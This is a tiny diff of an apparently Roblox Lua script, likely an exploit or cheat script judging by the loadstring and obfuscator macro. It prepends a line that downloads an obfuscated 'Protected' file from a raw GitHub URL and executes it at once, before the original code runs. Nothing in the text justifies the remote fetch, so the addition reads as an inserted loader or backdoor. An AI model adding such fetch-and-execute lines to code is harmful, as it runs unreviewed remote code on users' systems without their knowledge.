@@ -1,3 +1,6 @@
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
+
 loadstring([[
     function LPH_NO_VIRTUALIZE(f) return f end;
 ]])(); 
